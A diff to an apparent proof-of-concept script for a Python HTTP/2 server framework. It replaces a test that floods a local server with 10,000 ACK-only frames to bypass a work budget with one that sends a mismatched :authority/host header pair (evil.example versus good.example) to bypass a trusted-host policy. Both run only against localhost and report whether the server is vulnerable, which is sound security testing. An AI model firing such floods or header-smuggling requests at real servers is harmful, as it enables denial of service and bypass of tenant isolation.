@@ -9,16 +9,13 @@ import sys
 import tempfile
 import threading
 from pathlib import Path
-from time import perf_counter
 
 sys.path.insert(0, str(Path(__file__).parents[1]))
 from http2 import support as h2
-
 from wreath import Wreath
+from wreath.policy import HttpPolicy, TrustedHostPolicy
 from wreath.reactor import metal_event_loop
 from wreath.server import Server, ServerConfig, TLSConfig
-
-FLOOD_FRAMES = 10_000
 
 
 def _certificate() -> tuple[str, str]:
@@ -58,57 +55,40 @@ def _certificate() -> tuple[str, str]:
 
 def _exchange(
     port: int,
-    output: list[tuple[bytes, float]],
+    output: list[bytes],
     loop: asyncio.AbstractEventLoop,
     finished: asyncio.Event,
 ) -> None:
-    started = perf_counter()
-    response = bytearray()
     try:
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
         context.set_alpn_protocols(["h2"])
         raw = socket.create_connection(("127.0.0.1", port), timeout=5)
-        with context.wrap_socket(raw, server_hostname="localhost") as client:
-            settings_ack = h2.encode_frame(h2.SETTINGS, h2.FLAG_ACK, 0, b"")
-            ping_ack = h2.encode_frame(h2.PING, h2.FLAG_ACK, 0, b"ackflood")
-            ack_flood = (settings_ack + ping_ack) * (FLOOD_FRAMES // 2)
-            headers = h2.build_headers_frame(
-                1,
-                [
-                    (b":method", b"GET"),
-                    (b":path", b"/health"),
-                    (b":scheme", b"https"),
-                    (b":authority", b"localhost"),
-                ],
-                end_stream=True,
-            )
-            try:
-                client.sendall(h2.PREFACE + h2.encode_settings({}) + ack_flood + headers)
-            except OSError:
-                pass
-            client.settimeout(2)
+        with context.wrap_socket(raw, server_hostname="evil.example") as client:
+            headers = [
+                (b":method", b"GET"),
+                (b":path", b"/"),
+                (b":scheme", b"https"),
+                (b":authority", b"evil.example"),
+                (b"host", b"good.example"),
+            ]
+            client.sendall(h2.PREFACE + h2.encode_settings({}))
+            client.sendall(h2.build_headers_frame(1, headers, end_stream=True))
+            client.settimeout(1)
+            response = bytearray()
             try:
                 while part := client.recv(4096):
                     response += part
-                    parser = h2.FrameParser()
-                    parser.feed(bytes(response))
-                    if any(
-                        frame.type == h2.GOAWAY
-                        or (frame.type == h2.HEADERS and frame.stream_id == 1)
-                        for frame in parser.frames()
-                    ):
-                        break
-            except OSError, TimeoutError:
+            except TimeoutError:
                 pass
+            output.append(bytes(response))
     finally:
-        output.append((bytes(response), perf_counter() - started))
         loop.call_soon_threadsafe(finished.set)
 
 
-async def _drive(server: Server, port: int) -> tuple[bytes, float]:
-    output: list[tuple[bytes, float]] = []
+async def _drive(server: Server, port: int) -> bytes:
+    output: list[bytes] = []
     loop = asyncio.get_running_loop()
     finished = asyncio.Event()
     thread = threading.Thread(target=_exchange, args=(port, output, loop, finished))
@@ -119,50 +99,49 @@ async def _drive(server: Server, port: int) -> tuple[bytes, float]:
     return output[0]
 
 
-def _outcome(response: bytes) -> tuple[bytes | None, bool]:
+def _status(response: bytes) -> bytes | None:
     parser = h2.FrameParser()
     parser.feed(response)
     decoder = h2.HpackDecoder()
-    status = None
-    goaway = False
     for frame in parser.frames():
         if frame.type == h2.HEADERS and frame.stream_id == 1:
-            status = dict(decoder.decode(frame.payload)).get(b":status")
-        elif frame.type == h2.GOAWAY:
-            goaway = True
-    return status, goaway
+            return dict(decoder.decode(frame.payload)).get(b":status")
+    return None
 
 
 def main() -> int:
     cert_path, key_path = _certificate()
-    handled: list[bool] = []
-    app = Wreath()
+    seen_hosts: list[str | None] = []
+    app = Wreath(http_policy=HttpPolicy(trusted_host=TrustedHostPolicy(("good.example",))))
 
-    @app.get("/health")
-    async def health(request) -> str:
-        handled.append(True)
-        return "ok"
+    @app.get("/")
+    async def index(request) -> str:
+        seen_hosts.append(request.header("host"))
+        return "protected tenant"
 
     loop = metal_event_loop(gc_mode="stock")
     try:
         tls = TLSConfig(certfile=cert_path, keyfile=key_path)
-        config = ServerConfig(host="127.0.0.1", port=0, protocols=("h2",), lifespan="off")
+        config = ServerConfig(
+            host="127.0.0.1",
+            port=0,
+            protocols=("h2",),
+            lifespan="off",
+        )
         server = Server(app, config, loop)
         loop.run_until_complete(server._start(ssl=tls.build_ssl_context(("h2",)), tls=None))
         port = server.sockets[0].getsockname()[1]
-        response, elapsed = loop.run_until_complete(_drive(server, port))
+        response = loop.run_until_complete(_drive(server, port))
     finally:
         loop.close()
         os.unlink(cert_path)
         os.unlink(key_path)
 
-    status, goaway = _outcome(response)
-    vulnerable = status == b"200" and handled == [True] and not goaway
-    wire_bytes = (FLOOD_FRAMES // 2) * (9 + 17)
-    print(f"input: {FLOOD_FRAMES:,} ACK-only frames / {wire_bytes:,} bytes")
-    print(f"elapsed: {elapsed:.3f}s")
-    print(f"HTTP/2 :status {status!r}; GOAWAY={goaway}")
-    print("VULNERABLE: ACK frames bypass the work budget" if vulnerable else "not vulnerable")
+    status = _status(response)
+    vulnerable = status == b"200" and seen_hosts == ["good.example"]
+    print(f"HTTP/2 :status {status!r}")
+    print(f"application Host: {seen_hosts!r}")
+    print("VULNERABLE" if vulnerable else "not vulnerable")
     return 0 if vulnerable else 1
 
 
